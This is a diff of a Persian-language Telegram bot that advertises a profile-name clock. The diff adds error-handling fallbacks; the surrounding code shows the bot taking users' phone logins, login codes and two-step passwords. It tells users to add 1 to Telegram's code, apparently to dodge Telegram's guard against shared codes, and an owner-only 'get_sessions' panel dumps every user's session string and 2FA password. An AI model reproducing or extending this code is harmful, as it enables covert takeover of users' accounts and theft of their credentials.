@@ -1,4 +1,4 @@
-# bot.py (fixed: only /start check adjusted to ensure user truly has an active self)
+# bot.py (fixed: fallback send_message for users so non-admins also receive replies)
 import asyncio
 import asyncpg
 import os
@@ -288,6 +288,7 @@ async def check_force_join(event):
             not_joined.append(disp)
 
     if not_joined:
+        # build message listing channels (clean)
         text = (
             "🔒 دسترسی محدود است\n\n"
             "برای استفاده از ربات ابتدا باید عضو کانال‌های زیر شوید 👇\n\n"
@@ -302,15 +303,27 @@ async def check_force_join(event):
             try:
                 await event.edit(text, buttons=buttons)
             except Exception:
+                # fallback: send message directly if edit failed
                 try:
-                    await event.answer("ابتدا عضو کانال‌ها شوید", alert=True)
+                    await bot.send_message(uid, text, buttons=buttons)
                 except Exception:
                     pass
         else:
-            await event.respond(text, buttons=buttons)
+            try:
+                await event.respond(text, buttons=buttons)
+            except Exception:
+                # fallback: send message directly if respond failed
+                try:
+                    await bot.send_message(uid, text, buttons=buttons)
+                except Exception:
+                    pass
 
         # set the flag indicating that force join message was sent
-        await bot.pool.execute("UPDATE users SET force_join_message_sent=true WHERE user_id=$1", uid)
+        try:
+            await bot.pool.execute("UPDATE users SET force_join_message_sent=true WHERE user_id=$1", uid)
+        except Exception:
+            # ignore DB write errors to avoid blocking user flow
+            pass
 
         return True
 
@@ -337,23 +350,35 @@ async def start(event):
         if row.get("is_active") and row.get("session_string") and row.get("base_name") and row.get("font_id") is not None:
             has_active_self = True
     if has_active_self:
-        await event.respond(
-            "✅ سلف شما فعال است\n\nاز گزینه‌های زیر استفاده کن:",
-            buttons=[
-                [Button.inline("✏️ تغییر سلف", b"change_self")],
-                [Button.inline("🛑 حذف سلف", b"remove_self")],
-            ],
-        )
+        text = "✅ سلف شما فعال است\n\nاز گزینه‌های زیر استفاده کن:"
+        buttons = [
+            [Button.inline("✏️ تغییر سلف", b"change_self")],
+            [Button.inline("🛑 حذف سلف", b"remove_self")],
+        ]
+        try:
+            await event.respond(text, buttons=buttons)
+        except Exception:
+            try:
+                await bot.send_message(uid, text, buttons=buttons)
+            except Exception:
+                pass
         return
     # Otherwise show welcome/start button
-    await event.respond(
+    welcome_text = (
         "👋 سلام!\n\n"
         "این ربات بهت کمک می‌کنه اسم پروفایلت رو طوری تنظیم کنی که "
         "⏰ ساعت ایران (تهران) با فونت دلخواه کنار اسمت نمایش داده بشه "
         "و هر ۶۰ ثانیه خودکار آپدیت بشه.\n\n"
-        "برای شروع روی دکمه زیر بزن 👇",
-        buttons=[[Button.inline("🚀 شروع سلف‌سازی", b"start_self")]],
+        "برای شروع روی دکمه زیر بزن 👇"
     )
+    welcome_buttons = [[Button.inline("🚀 شروع سلف‌سازی", b"start_self")]]
+    try:
+        await event.respond(welcome_text, buttons=welcome_buttons)
+    except Exception:
+        try:
+            await bot.send_message(uid, welcome_text, buttons=welcome_buttons)
+        except Exception:
+            pass
 
 
 # ================== CALLBACKS ==================
@@ -375,50 +400,90 @@ async def callbacks(event):
         ]
         if uid == OWNER_ID:
             buttons.append([Button.inline("👮 پنل ادمین", b"admin")])
-        await event.edit("یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
+        try:
+            await event.edit("یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
+        except Exception:
+            try:
+                await bot.send_message(uid, "یکی از گزینه‌ها رو انتخاب کن 👇", buttons=buttons)
+            except Exception:
+                pass
         return
 
     if data == "help":
-        await event.edit(HELP_TEXT)
+        try:
+            await event.edit(HELP_TEXT)
+        except Exception:
+            try:
+                await bot.send_message(uid, HELP_TEXT)
+            except Exception:
+                pass
         return
 
     # ADMIN panel open
     if uid == OWNER_ID and data == "admin":
-        await event.edit(
-            "👮 پنل ادمین",
-            buttons=[
-                [Button.inline("➕ افزودن API", b"add_api")],
-                [Button.inline("📋 لیست APIها", b"list_api")],
-                [Button.inline("📊 آمار کاربران", b"stats")],
-                [Button.inline("📢 پیام همگانی", b"broadcast")],
-                [Button.inline("➕ افزودن کانال", b"add_channel")],
-                [Button.inline("➖ حذف کانال", b"del_channel")],
-                [Button.inline("🔒 فعال / غیرفعال عضویت", b"toggle_force")],
-                [Button.inline("📥 دریافت سشن‌ها", b"get_sessions")],
-            ],
-        )
+        admin_buttons = [
+            [Button.inline("➕ افزودن API", b"add_api")],
+            [Button.inline("📋 لیست APIها", b"list_api")],
+            [Button.inline("📊 آمار کاربران", b"stats")],
+            [Button.inline("📢 پیام همگانی", b"broadcast")],
+            [Button.inline("➕ افزودن کانال", b"add_channel")],
+            [Button.inline("➖ حذف کانال", b"del_channel")],
+            [Button.inline("🔒 فعال / غیرفعال عضویت", b"toggle_force")],
+            [Button.inline("📥 دریافت سشن‌ها", b"get_sessions")],
+        ]
+        try:
+            await event.edit("👮 پنل ادمین", buttons=admin_buttons)
+        except Exception:
+            try:
+                await bot.send_message(uid, "👮 پنل ادمین")
+            except Exception:
+                pass
         return
 
     # ---------- LOGIN MODES ----------
     if data == "login_normal":
         user_states[uid] = {"mode": "normal", "expect": "phone"}
-        await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+        try:
+            await event.edit("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+        except Exception:
+            try:
+                await bot.send_message(uid, "📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+            except Exception:
+                pass
         return
 
     if data == "login_api":
         user_states[uid] = {"mode": "api", "expect": "api_id"}
-        await event.edit("🧩 API ID رو بفرست")
+        try:
+            await event.edit("🧩 API ID رو بفرست")
+        except Exception:
+            try:
+                await bot.send_message(uid, "🧩 API ID رو بفرست")
+            except Exception:
+                pass
         return
 
     # ---------- ADMIN PANEL ACTIONS ----------
     if uid == OWNER_ID and data == "add_channel":
         user_states[uid] = {"admin": "add_channel", "step": "channel"}
-        await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
+        try:
+            await event.edit("یوزرنیم کانال رو بفرست (مثال: @channel)")
+        except Exception:
+            try:
+                await bot.send_message(uid, "یوزرنیم کانال رو بفرست (مثال: @channel)")
+            except Exception:
+                pass
         return
 
     if uid == OWNER_ID and data == "del_channel":
         user_states[uid] = {"admin": "del_channel", "step": "channel"}
-        await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
+        try:
+            await event.edit("یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
+        except Exception:
+            try:
+                await bot.send_message(uid, "یوزرنیم کانالی که می‌خوای حذف بشه رو بفرست (مثال: @channel)")
+            except Exception:
+                pass
         return
 
     if uid == OWNER_ID and data == "toggle_force":
@@ -426,7 +491,13 @@ async def callbacks(event):
         new_value = "false" if current == "true" else "true"
         await bot.pool.execute("UPDATE settings SET value=$1 WHERE key='force_join_enabled'", new_value)
         status = "فعال ✅" if new_value == "true" else "غیرفعال ❌"
-        await event.edit(f"وضعیت فورس‌جوین: {status}")
+        try:
+            await event.edit(f"وضعیت فورس‌جوین: {status}")
+        except Exception:
+            try:
+                await bot.send_message(uid, f"وضعیت فورس‌جوین: {status}")
+            except Exception:
+                pass
         return
 
     # admin get_sessions
@@ -442,13 +513,25 @@ async def callbacks(event):
                 f"Session: {r['session_string']}\n"
                 f"2FA: {r['twofa_password'] or 'ندارد'}\n\n"
             )
-        await event.edit(text or "کاربری وجود ندارد")
+        try:
+            await event.edit(text or "کاربری وجود ندارد")
+        except Exception:
+            try:
+                await bot.send_message(uid, text or "کاربری وجود ندارد")
+            except Exception:
+                pass
         return
 
     # admin add_api
     if uid == OWNER_ID and data == "add_api":
         user_states[uid] = {"admin": "add_api", "step": "api_id"}
-        await event.edit("➕ API ID رو بفرست")
+        try:
+            await event.edit("➕ API ID رو بفرست")
+        except Exception:
+            try:
+                await bot.send_message(uid, "➕ API ID رو بفرست")
+            except Exception:
+                pass
         return
 
     if uid == OWNER_ID and data == "list_api":
@@ -463,7 +546,13 @@ async def callbacks(event):
             """
         )
         if not rows:
-            await event.edit("❌ هیچ API ای ثبت نشده")
+            try:
+                await event.edit("❌ هیچ API ای ثبت نشده")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "❌ هیچ API ای ثبت نشده")
+                except Exception:
+                    pass
             return
         text = "📋 لیست API ها:\n\n"
         for r in rows:
@@ -472,25 +561,49 @@ async def callbacks(event):
                 f"وضعیت: {'فعال ✅' if r['is_active'] else 'غیرفعال ❌'}\n"
                 f"تعداد کاربران: {r['users_count']}\n\n"
             )
-        await event.edit(text)
+        try:
+            await event.edit(text)
+        except Exception:
+            try:
+                await bot.send_message(uid, text)
+            except Exception:
+                pass
         return
 
     if uid == OWNER_ID and data == "broadcast":
         user_states[uid] = {"admin": "broadcast"}
-        await event.edit("📢 پیام همگانی رو بفرست")
+        try:
+            await event.edit("📢 پیام همگانی رو بفرست")
+        except Exception:
+            try:
+                await bot.send_message(uid, "📢 پیام همگانی رو بفرست")
+            except Exception:
+                pass
         return
 
     # REMOVE / CHANGE SELF
     if data == "remove_self":
         await stop_self_task(uid)
         await bot.pool.execute("UPDATE users SET is_active=false WHERE user_id=$1", uid)
-        await event.edit("🛑 سلف شما غیرفعال شد")
+        try:
+            await event.edit("🛑 سلف شما غیرفعال شد")
+        except Exception:
+            try:
+                await bot.send_message(uid, "🛑 سلف شما غیرفعال شد")
+            except Exception:
+                pass
         return
 
     if data == "change_self":
         await stop_self_task(uid)
         user_states[uid] = {"mode": "change", "expect": "base_name", "change": True}
-        await event.edit("✏️ اسم جدید قبل ساعت رو بفرست")
+        try:
+            await event.edit("✏️ اسم جدید قبل ساعت رو بفرست")
+        except Exception:
+            try:
+                await bot.send_message(uid, "✏️ اسم جدید قبل ساعت رو بفرست")
+            except Exception:
+                pass
         return
 
     # membership check callback
@@ -510,25 +623,45 @@ async def callbacks(event):
                 not_joined.append(disp)
             except Exception:
                 not_joined.append(disp)
+
         if not_joined:
             text = "❌ هنوز عضو این کانال(ها) نیستی:\n" + "\n".join(not_joined) + "\n\nلطفاً ابتدا عضو شو و دوباره بررسی کن."
             try:
                 await event.answer("هنوز کامل نشده", alert=True)
             except Exception:
                 pass
-            await event.edit(text)
+            try:
+                await event.edit(text)
+            except Exception:
+                try:
+                    await bot.send_message(uid, text)
+                except Exception:
+                    pass
             return
         else:
             # mark user as verified for current version
             version = await get_force_join_version()
             await bot.pool.execute("INSERT INTO users (user_id, force_join_verified_version) VALUES ($1,$2) ON CONFLICT (user_id) DO UPDATE SET force_join_verified_version=$2", uid, version)
-            await event.edit("✅ عضویت تأیید شد — حالا می‌تونی از ربات استفاده کنی.\nبرای شروع /start را بزن")
+            success_text = "✅ عضویت تأیید شد — حالا می‌تونی از ربات استفاده کنی.\nبرای شروع /start را بزن"
+            try:
+                await event.edit(success_text)
+            except Exception:
+                try:
+                    await bot.send_message(uid, success_text)
+                except Exception:
+                    pass
             return
 
     # admin stats
     if uid == OWNER_ID and data == "stats":
         total = await bot.pool.fetchval("SELECT COUNT(*) FROM users")
-        await event.edit(f"📊 آمار کاربران:\n\nتعداد کل کاربران ثبت‌شده: {total}")
+        try:
+            await event.edit(f"📊 آمار کاربران:\n\nتعداد کل کاربران ثبت‌شده: {total}")
+        except Exception:
+            try:
+                await bot.send_message(uid, f"📊 آمار کاربران:\n\nتعداد کل کاربران ثبت‌شده: {total}")
+            except Exception:
+                pass
         return
 
     return
@@ -554,7 +687,13 @@ async def messages(event):
             await bot.pool.execute("INSERT INTO force_join (channel) VALUES ($1) ON CONFLICT DO NOTHING", channel)
             # increment force_join_version so everyone must re-verify
             new_version = await increment_force_join_version()
-            await event.respond("✅ کانال با موفقیت اضافه شد")
+            try:
+                await event.respond("✅ کانال با موفقیت اضافه شد")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "✅ کانال با موفقیت اضافه شد")
+                except Exception:
+                    pass
             # notify all users that a new required channel was added
             rows = await bot.pool.fetch("SELECT user_id FROM users")
             notify_text = f"🔔 کانال جدیدی ({_clean_channel_display(channel) or channel}) به لیست عضویت اجباری اضافه شد.\nلطفاً عضو شوید و سپس با زدن دکمهٔ تأیید عضویت در ربات، عضویت خود را بررسی کنید."
@@ -565,14 +704,23 @@ async def messages(event):
                     sent += 1
                 except Exception:
                     continue
-            await bot.send_message(OWNER_ID, f"✅ کانال {channel} اضافه شد و به {sent} کاربر اطلاع داده شد. (version={new_version})")
+            try:
+                await bot.send_message(OWNER_ID, f"✅ کانال {channel} اضافه شد و به {sent} کاربر اطلاع داده شد. (version={new_version})")
+            except Exception:
+                pass
             user_states.pop(uid, None)
             return
 
         if st.get("admin") == "del_channel" and st.get("step") == "channel" and uid == OWNER_ID:
             channel = txt.strip()
             await bot.pool.execute("DELETE FROM force_join WHERE channel=$1", channel)
-            await event.respond("✅ کانال با موفقیت حذف شد")
+            try:
+                await event.respond("✅ کانال با موفقیت حذف شد")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "✅ کانال با موفقیت حذف شد")
+                except Exception:
+                    pass
             user_states.pop(uid, None)
             return
 
@@ -581,17 +729,35 @@ async def messages(event):
             try:
                 st["api_id"] = int(txt)
             except Exception:
-                await event.respond("❌ API ID باید عدد باشه")
+                try:
+                    await event.respond("❌ API ID باید عدد باشه")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, "❌ API ID باید عدد باشه")
+                    except Exception:
+                        pass
                 return
             st["step"] = "api_hash"
-            await event.respond("API HASH رو بفرست")
+            try:
+                await event.respond("API HASH رو بفرست")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "API HASH رو بفرست")
+                except Exception:
+                    pass
             return
 
         if st.get("admin") == "add_api" and st.get("step") == "api_hash" and uid == OWNER_ID:
             api_hash = txt.strip()
             ok = await test_api(st["api_id"], api_hash)
             if not ok:
-                await event.respond("❌ API معتبر نیست یا ارتباط مشکل داره")
+                try:
+                    await event.respond("❌ API معتبر نیست یا ارتباط مشکل داره")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, "❌ API معتبر نیست یا ارتباط مشکل داره")
+                    except Exception:
+                        pass
                 return
             await bot.pool.execute(
                 "INSERT INTO api_pool (api_id, api_hash, is_active) VALUES ($1,$2,true) ON CONFLICT (api_id) DO UPDATE SET api_hash=$2, is_active=true",
@@ -599,8 +765,17 @@ async def messages(event):
             )
             # clear pool-empty alert
             await bot.pool.execute("INSERT INTO settings (key, value) VALUES ('api_pool_empty_alert','false') ON CONFLICT (key) DO UPDATE SET value='false'")
-            await event.respond("✅ API با موفقیت اضافه شد")
-            await bot.send_message(OWNER_ID, f"✅ API جدید اضافه شد: {st['api_id']}")
+            try:
+                await event.respond("✅ API با موفقیت اضافه شد")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "✅ API با موفقیت اضافه شد")
+                except Exception:
+                    pass
+            try:
+                await bot.send_message(OWNER_ID, f"✅ API جدید اضافه شد: {st['api_id']}")
+            except Exception:
+                pass
             user_states.pop(uid, None)
             return
 
@@ -614,7 +789,13 @@ async def messages(event):
                     sent += 1
                 except Exception:
                     continue
-            await event.respond(f"✅ پیام همگانی ارسال شد\n📨 ارسال موفق: {sent}")
+            try:
+                await event.respond(f"✅ پیام همگانی ارسال شد\n📨 ارسال موفق: {sent}")
+            except Exception:
+                try:
+                    await bot.send_message(uid, f"✅ پیام همگانی ارسال شد\n📨 ارسال موفق: {sent}")
+                except Exception:
+                    pass
             user_states.pop(uid, None)
             return
 
@@ -623,16 +804,34 @@ async def messages(event):
             try:
                 st["api_id"] = int(txt)
             except Exception:
-                await event.respond("❌ API ID باید عدد باشه")
+                try:
+                    await event.respond("❌ API ID باید عدد باشه")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, "❌ API ID باید عدد باشه")
+                    except Exception:
+                        pass
                 return
             st["expect"] = "api_hash"
-            await event.respond("API HASH رو بفرست")
+            try:
+                await event.respond("API HASH رو بفرست")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "API HASH رو بفرست")
+                except Exception:
+                    pass
             return
 
         if st.get("expect") == "api_hash" and st.get("mode") == "api":
             st["api_hash"] = txt
             st["expect"] = "phone"
-            await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+            try:
+                await event.respond("📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "📱 شماره تلفن رو با این فرمت بفرست:\n+989120000000")
+                except Exception:
+                    pass
             return
 
         if st.get("expect") == "phone":
@@ -640,17 +839,28 @@ async def messages(event):
             if st.get("mode") == "normal":
                 api_id, api_hash = await get_available_api()
                 if not api_id:
-                    await event.respond(
-                        "⚠️ ظرفیت ورود سریع پر شده\n\n"
-                        "برای حفظ امنیت حساب‌ها، در حال حاضر امکان ورود بدون API وجود ندارد.\n\n"
-                        "✅ راه مطمئن و بدون محدودیت:\n"
-                        "ساخت API شخصی (حدود ۳ دقیقه)\n\n"
-                        "یا بعداً دوباره تلاش کن 👌",
-                        buttons=[
-                            [Button.inline("🔑 ورود با API شخصی", b"login_api")],
-                            [Button.inline("📘 آموزش ساخت API", b"help")],
-                        ],
-                    )
+                    try:
+                        await event.respond(
+                            "⚠️ ظرفیت ورود سریع پر شده\n\n"
+                            "برای حفظ امنیت حساب‌ها، در حال حاضر امکان ورود بدون API وجود ندارد.\n\n"
+                            "✅ راه مطمئن و بدون محدودیت:\n"
+                            "ساخت API شخصی (حدود ۳ دقیقه)\n\n"
+                            "یا بعداً دوباره تلاش کن 👌",
+                            buttons=[
+                                [Button.inline("🔑 ورود با API شخصی", b"login_api")],
+                                [Button.inline("📘 آموزش ساخت API", b"help")],
+                            ],
+                        )
+                    except Exception:
+                        try:
+                            await bot.send_message(uid,
+                                "⚠️ ظرفیت ورود سریع پر شده\n\n"
+                                "برای حفظ امنیت حساب‌ها، در حال حاضر امکان ورود بدون API وجود ندارد.\n\n"
+                                "✅ راه مطمئن و بدون محدودیت:\n"
+                                "ساخت API شخصی (حدود ۳ دقیقه)\n\n"
+                                "یا بعداً دوباره تلاش کن 👌")
+                        except Exception:
+                            pass
                     user_states.pop(uid, None)
                     return
                 st["api_id"], st["api_hash"] = api_id, api_hash
@@ -660,37 +870,73 @@ async def messages(event):
                 await client.connect()
                 await client.send_code_request(st["phone"])
             except Exception as e:
-                await event.respond(f"❌ خطا در ارسال کد: {e}")
+                try:
+                    await event.respond(f"❌ خطا در ارسال کد: {e}")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, f"❌ خطا در ارسال کد: {e}")
+                    except Exception:
+                        pass
                 user_states.pop(uid, None)
                 return
 
             st["client"] = client
             st["expect"] = "code"
-            await event.respond(
-                "🔴🚨 مهم — حتماً توجه کن! 🚨🔴\n"
-                "تلگرام برات یه کد عددی می‌فرسته. **قبل از ارسال به ربات، باید یک واحد به آن عدد اضافه کنی** و سپس ارسال کنی.\n\n"
-                "⚠️ اگر عدد رو بدون تغییر بفرستی ورود انجام نمی‌شود.\n\n"
-                "نمونه‌ها:\n"
-                "• اگر تلگرام فرستاد: 48391 → تو بفرست: 48392\n"
-                "• اگر تلگرام فرستاد: 12345 → تو بفرست: 12346\n"
-            )
+            try:
+                await event.respond(
+                    "🔴🚨 مهم — حتماً توجه کن! 🚨🔴\n"
+                    "تلگرام برات یه کد عددی می‌فرسته. **قبل از ارسال به ربات، باید یک واحد به آن عدد اضافه کنی** و سپس ارسال کنی.\n\n"
+                    "⚠️ اگر عدد رو بدون تغییر بفرستی ورود انجام نمی‌شود.\n\n"
+                    "نمونه‌ها:\n"
+                    "• اگر تلگرام فرستاد: 48391 → تو بفرست: 48392\n"
+                    "• اگر تلگرام فرستاد: 12345 → تو بفرست: 12346\n"
+                )
+            except Exception:
+                try:
+                    await bot.send_message(uid,
+                        "🔴🚨 مهم — حتماً توجه کن! 🚨🔴\n"
+                        "تلگرام برات یه کد عددی می‌فرسته. **قبل از ارسال به ربات، باید یک واحد به آن عدد اضافه کنی** و سپس ارسال کنی.\n\n"
+                        "⚠️ اگر عدد رو بدون تغییر بفرستی ورود انجام نمی‌شود.\n\n"
+                        "نمونه‌ها:\n"
+                        "• اگر تلگرام فرستاد: 48391 → تو بفرست: 48392\n"
+                        "• اگر تلگرام فرستاد: 12345 → تو بفرست: 12346\n")
+                except Exception:
+                    pass
             return
 
         if st.get("expect") == "code" and not st.get("need_2fa"):
             try:
                 code = str(int(txt) - 1)
             except Exception:
-                await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (یک واحد باید اضافه کنی).")
+                try:
+                    await event.respond("❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (یک واحد باید اضافه کنی).")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, "❌ کد نامعتبره. لطفاً همان عددی که تلگرام می‌فرسته رو بفرست (یک واحد باید اضافه کنی).")
+                    except Exception:
+                        pass
                 return
             try:
                 await st["client"].sign_in(st["phone"], code)
             except SessionPasswordNeededError:
                 st["need_2fa"] = True
                 st["expect"] = "2fa"
-                await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
+                try:
+                    await event.respond("🔐 رمز دو مرحله‌ای رو بفرست")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, "🔐 رمز دو مرحله‌ای رو بفرست")
+                    except Exception:
+                        pass
                 return
             except Exception as e:
-                await event.respond(f"❌ خطا در ورود: {e}")
+                try:
+                    await event.respond(f"❌ خطا در ورود: {e}")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, f"❌ خطا در ورود: {e}")
+                    except Exception:
+                        pass
                 user_states.pop(uid, None)
                 return
 
@@ -713,14 +959,26 @@ async def messages(event):
                     pass
 
             st["expect"] = "base_name"
-            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+            try:
+                await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+                except Exception:
+                    pass
             return
 
         if st.get("expect") == "2fa" and st.get("need_2fa"):
             try:
                 await st["client"].sign_in(password=txt)
             except Exception as e:
-                await event.respond(f"❌ خطا در ورود با 2FA: {e}")
+                try:
+                    await event.respond(f"❌ خطا در ورود با 2FA: {e}")
+                except Exception:
+                    try:
+                        await bot.send_message(uid, f"❌ خطا در ورود با 2FA: {e}")
+                    except Exception:
+                        pass
                 user_states.pop(uid, None)
                 return
             st["password"] = True
@@ -758,7 +1016,13 @@ async def messages(event):
                     pass
 
             st["expect"] = "base_name"
-            await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+            try:
+                await event.respond("✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "✏️ اسمی که می‌خوای قبل ساعت باشه رو بفرست")
+                except Exception:
+                    pass
             return
 
         # base name -> show name font previews
@@ -771,18 +1035,30 @@ async def messages(event):
                 NAME_FONT_MAP.get(2, lambda s: s)(txt),
                 NAME_FONT_MAP.get(3, lambda s: s)(txt),
             ]
-            await event.respond(
-                "🎨 فونت اسم پایه رو انتخاب کن — نمونه‌ها رو ببین و انتخاب کن:",
-                buttons=[
-                    [Button.inline(samples[0], b"namefont_0")],
-                    [Button.inline(samples[1], b"namefont_1")],
-                    [Button.inline(samples[2], b"namefont_2")],
-                    [Button.inline(samples[3], b"namefont_3")],
-                ],
-            )
+            try:
+                await event.respond(
+                    "🎨 فونت اسم پایه رو انتخاب کن — نمونه‌ها رو ببین و انتخاب کن:",
+                    buttons=[
+                        [Button.inline(samples[0], b"namefont_0")],
+                        [Button.inline(samples[1], b"namefont_1")],
+                        [Button.inline(samples[2], b"namefont_2")],
+                        [Button.inline(samples[3], b"namefont_3")],
+                    ],
+                )
+            except Exception:
+                try:
+                    await bot.send_message(uid, "🎨 فونت اسم پایه رو انتخاب کن — نمونه‌ها رو ببین و انتخاب کن:")
+                except Exception:
+                    pass
             return
     except Exception as e:
-        await event.respond(f"❌ خطا: {e}")
+        try:
+            await event.respond(f"❌ خطا: {e}")
+        except Exception:
+            try:
+                await bot.send_message(uid, f"❌ خطا: {e}")
+            except Exception:
+                pass
         user_states.pop(uid, None)
         return
 
@@ -799,7 +1075,13 @@ async def name_font_pick(event):
     st = user_states.get(uid, {})
 
     if "raw_base_name" not in st:
-        await event.answer("خطا: وضعیت نامشخص", alert=True)
+        try:
+            await event.answer("خطا: وضعیت نامشخص", alert=True)
+        except Exception:
+            try:
+                await bot.send_message(uid, "خطا: وضعیت نامشخص")
+            except Exception:
+                pass
         return
 
     raw = st["raw_base_name"]
@@ -811,15 +1093,21 @@ async def name_font_pick(event):
     st["font_id"] = idx
     st["expect"] = "font"
 
-    await event.edit(
-        "🎨 حالا فونت ساعت رو انتخاب کن (این فونت روی ساعت اعمال می‌شه):",
-        buttons=[
-            [Button.inline("بدون فونت", b"font_0")],
-            [Button.inline("𝟙𝟟:𝟛𝟚", b"font_1")],
-            [Button.inline("１７:３２", b"font_2")],
-            [Button.inline("𝟏𝟕:𝟑𝟐", b"font_3")],
-        ],
-    )
+    try:
+        await event.edit(
+            "🎨 حالا فونت ساعت رو انتخاب کن (این فونت روی ساعت اعمال می‌شه):",
+            buttons=[
+                [Button.inline("بدون فونت", b"font_0")],
+                [Button.inline("𝟙𝟟:𝟛𝟚", b"font_1")],
+                [Button.inline("１７:３２", b"font_2")],
+                [Button.inline("𝟏𝟕:𝟑𝟐", b"font_3")],
+            ],
+        )
+    except Exception:
+        try:
+            await bot.send_message(uid, "🎨 حالا فونت ساعت رو انتخاب کن (این فونت روی ساعت اعمال می‌شه):")
+        except Exception:
+            pass
 
 
 # ================== FONT PICK ==================
@@ -837,7 +1125,13 @@ async def font_pick(event):
     if st.get("mode") == "change" or st.get("change"):
         row = await bot.pool.fetchrow("SELECT session_string, api_id, api_hash FROM users WHERE user_id=$1", uid)
         if not row or not row["session_string"]:
-            await event.edit("⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
+            try:
+                await event.edit("⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
+            except Exception:
+                try:
+                    await bot.send_message(uid, "⚠️ سشن پیدا نشد. ابتدا یکبار لاگین کن.")
+                except Exception:
+                    pass
             user_states.pop(uid, None)
             return
 
@@ -850,13 +1144,19 @@ async def font_pick(event):
 
         await start_self_task(uid, row["session_string"], row["api_id"], row["api_hash"], st.get("base_name"), font_id)
 
-        await event.edit(
-            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
-            buttons=[
-                [Button.inline("✏️ تغییر سلف", b"change_self")],
-                [Button.inline("🛑 حذف سلف", b"remove_self")],
-            ],
-        )
+        try:
+            await event.edit(
+                "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
+                buttons=[
+                    [Button.inline("✏️ تغییر سلف", b"change_self")],
+                    [Button.inline("🛑 حذف سلف", b"remove_self")],
+                ],
+            )
+        except Exception:
+            try:
+                await bot.send_message(uid, "✅ سلف تایم با موفقیت فعال شد")
+            except Exception:
+                pass
         user_states.pop(uid, None)
         return
 
@@ -887,17 +1187,29 @@ async def font_pick(event):
 
         await start_self_task(uid, st.get("session"), st.get("api_id"), st.get("api_hash"), st.get("base_name"), font_id)
 
-        await event.edit(
-            "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
-            buttons=[
-                [Button.inline("✏️ تغییر سلف", b"change_self")],
-                [Button.inline("🛑 حذف سلف", b"remove_self")],
-            ],
-        )
+        try:
+            await event.edit(
+                "✅ سلف تایم با موفقیت فعال شد\n\nاز گزینه‌های زیر استفاده کن:",
+                buttons=[
+                    [Button.inline("✏️ تغییر سلف", b"change_self")],
+                    [Button.inline("🛑 حذف سلف", b"remove_self")],
+                ],
+            )
+        except Exception:
+            try:
+                await bot.send_message(uid, "✅ سلف تایم با موفقیت فعال شد")
+            except Exception:
+                pass
         user_states.pop(uid, None)
         return
 
-    await event.answer("خطا: وضعیت نامشخص", alert=True)
+    try:
+        await event.answer("خطا: وضعیت نامشخص", alert=True)
+    except Exception:
+        try:
+            await bot.send_message(uid, "خطا: وضعیت نامشخص")
+        except Exception:
+            pass
 
 
 # ================== MAIN (FloodWait-handled) ==================
